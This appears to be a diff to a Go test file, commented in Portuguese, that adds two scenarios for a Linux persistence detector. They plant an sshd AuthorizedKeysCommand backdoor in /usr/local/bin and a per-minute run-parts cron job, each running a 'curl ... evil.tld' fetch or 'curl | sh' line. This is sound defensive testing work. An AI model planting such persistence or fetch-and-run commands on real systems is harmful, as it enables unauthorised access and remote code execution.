@@ -23,6 +23,8 @@ package scenario
 //	A6  dentro de um runtime JIT    a isenção que existe para calar o ruído
 //	A7  sob uma unit de systemd     o ponto cego declarado do §3.15
 //	A8  listener fechado no accept  a direção inferida invertida — e ela ERRAVA
+//	A9  nome de integração no /usr/local  a allowlist do sshd dada de graça
+//	A10 run-parts para diretório próprio  isenção por prefixo, coleta por lista
 
 func init() {
 	Register(Scenario{
@@ -276,6 +278,67 @@ func init() {
 		// Orçamento de ruído MEDIDO: o binário sem dono em /usr/local/sbin
 		// continua sendo achado de propriedade (§24) e a escuta some junto com
 		// o listener — o que este cenário afirma é o silêncio do §17.
+		MaxWarn: 3,
+	})
+
+	Register(Scenario{
+		ID:   "A9-allowlist-do-sshd-em-usr-local",
+		Desc: "backdoor com nome de integração conhecida em /usr/local/bin: a isenção do AuthorizedKeysCommand era dada de graça",
+		// ATAQUE À ALLOWLIST. O check isenta quatro integrações de diretório
+		// (userdbctl, SSSD, OS Login, EC2 Instance Connect) quando o programa
+		// está em diretório de sistema — sem isso, todo Arch de fábrica vira
+		// ruído.
+		//
+		// /usr/local/bin estava nessa lista de "diretório de sistema", e a FHS
+		// reserva /usr/local ao administrador LOCAL: é onde quem conseguiu root
+		// escreve, e o resto desta ferramenta o trata assim. Um
+		// `/usr/local/bin/userdbctl` plantado herdava a reputação do systemd, e
+		// o programa que decide QUEM ENTRA na máquina saía com RESULT OK e
+		// cobertura 89/89. Medido antes da correção.
+		Images: matriz,
+		Plant: `mkdir -p /etc/ssh /usr/local/bin
+			printf '#!/bin/sh\ncurl -s http://evil.tld/k\n' > /usr/local/bin/userdbctl
+			chmod +x /usr/local/bin/userdbctl
+			printf 'AuthorizedKeysCommand /usr/local/bin/userdbctl\nAuthorizedKeysCommandUser root\n' > /etc/ssh/sshd_config`,
+		Expect: []Expect{
+			{ID: "persist.sshd_key_source", Evidence: "/usr/local/bin/userdbctl"},
+		},
+		Exit: -1,
+		// Orçamento MEDIDO: o binário sem dono entra na pergunta de propriedade
+		// agora que o AuthorizedKeysCommand é candidato (§24).
+		MaxWarn: 3,
+	})
+
+	Register(Scenario{
+		ID:   "A10-run-parts-para-diretorio-proprio",
+		Desc: "run-parts apontando para /etc/cron.backup: a isenção casava por PREFIXO e a coleta por lista fechada",
+		// ATAQUE A DUAS SUPRESSÕES QUE SE COBRIAM.
+		//
+		// O check de frequência isenta `run-parts` sobre os diretórios da
+		// distribuição — plumbing, e o Alpine entrega `*/15 run-parts
+		// /etc/periodic/15min` de fábrica. A isenção casava por PREFIXO
+		// (`/etc/cron.`), então `/etc/cron.backup` também era isentado; e o
+		// coletor só percorre uma lista FECHADA, então o conteúdo daquele
+		// diretório nunca era lido.
+		//
+		// Quem escolhia o nome do diretório escolhia se a linha era olhada. Um
+		// `curl | sh` a cada minuto saía com RESULT OK.
+		Images: matriz,
+		Plant: `mkdir -p /etc/cron.backup
+			printf '#!/bin/sh\ncurl -s http://evil.tld/x | sh\n' > /etc/cron.backup/sync
+			chmod +x /etc/cron.backup/sync
+			printf '*/1 * * * * root run-parts /etc/cron.backup\n' > /etc/crontab`,
+		Expect: []Expect{
+			// a LINHA de um minuto deixa de ser plumbing — a evidência precisa
+			// citá-la, ou a asserção casa com o achado do script e deixa de
+			// medir a isenção do check
+			{ID: "persist.cron_frequent", Evidence: "run-parts /etc/cron.backup"},
+			// e o script lá dentro passa a ser coletado — ele herda o gatilho
+			// da linha que o executa, e por isso aparece com a MESMA cadência
+			{ID: "persist.cron_frequent", Evidence: "/etc/cron.backup/sync"},
+		},
+		Exit: -1,
+		// Orçamento MEDIDO.
 		MaxWarn: 3,
 	})
 
